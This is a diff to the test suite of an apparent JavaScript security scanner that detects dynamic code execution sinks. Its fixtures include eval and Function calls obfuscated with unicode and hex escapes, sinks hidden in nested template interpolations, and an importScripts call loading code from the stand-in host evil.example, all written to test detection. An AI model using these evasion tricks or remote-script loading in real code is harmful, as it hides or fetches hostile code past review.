@@ -28,6 +28,14 @@ import {
 /** Does the shared sink set fire on this source? */
 const fires = (code: string): boolean => findDynamicCodeSinks(code).length > 0;
 
+/**
+ * Build the template source `` `${expr}` `` as FIXTURE TEXT.
+ *
+ * Written through a helper so the `${` never appears inside a plain string
+ * literal, where it reads as an interpolation this file does not intend.
+ */
+const tpl = (expr: string): string => `\`$${'{'}${expr}}\``;
+
 describe('the Function constructor', () => {
   it.each([
     ['new Function("…")', 'const f = new Function("return 1");'],
@@ -271,6 +279,54 @@ describe('lexing hazards', () => {
   it('reports the line the sink starts on', () => {
     const code = ['const a = 1;', 'const b = 2;', "eval('x');"].join('\n');
     expect(findDynamicCodeSinks(code)).toEqual([{ label: 'eval()', line: 3 }]);
+  });
+});
+
+describe('lexical grammar coverage', () => {
+  // Round 11 findings. Unlike the spelling enumeration this module replaced,
+  // these are a CLOSED set: the tokeniser has to cover JavaScript's lexical
+  // grammar, and that grammar is finite and specified.
+  it.each([
+    ['a \\u escape in a bare identifier', "\\u0065val('payload')"],
+    ['a \\u escape in a member name', "globalThis.F\\u0075nction('return 42')()"],
+    ['a \\u{…} escape', "\\u{65}val('payload')"],
+    ['an escape in a computed member name', "globalThis['\\u0065val']('payload')"],
+  ])('decodes %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  it.each([
+    ['eval', `const x = ${tpl('eval(payload)')};`],
+    ['the Function constructor', `const x = ${tpl('Function("return 1")()')};`],
+    ['a string timer', `const x = ${tpl('setTimeout("evil()", 0)')};`],
+    ['a sink in a NESTED interpolation', `const x = ${tpl(tpl('eval(payload)'))};`],
+  ])('finds %s inside a template interpolation', (_label, code) => {
+    // An interpolation is executable code, not text — emitting the literal as
+    // one opaque token hid every sink written inside one.
+    expect(fires(code)).toBe(true);
+  });
+
+  it('treats an INTERPOLATED template as a string argument', () => {
+    // Still a string the host compiles, so the timer form fires…
+    expect(fires(`setTimeout(\`evil($${'{'}value})\`, 0)`)).toBe(true);
+    // …and a remote URL is remote even when only its path varies.
+    expect(
+      findDynamicCodeSinks(`importScripts(\`https://evil.example/$${'{'}name}.js\`)`, [
+        REMOTE_IMPORT_SCRIPTS_SINK,
+      ]),
+    ).toHaveLength(1);
+  });
+
+  it('does not treat a same-origin interpolated template as remote', () => {
+    expect(
+      findDynamicCodeSinks(`importScripts(\`./chunks/$${'{'}name}.js\`)`, [
+        REMOTE_IMPORT_SCRIPTS_SINK,
+      ]),
+    ).toEqual([]);
+  });
+
+  it('decodes escapes inside a computed member string', () => {
+    expect(fires("self['\\x65val']('payload')")).toBe(true);
   });
 });
 
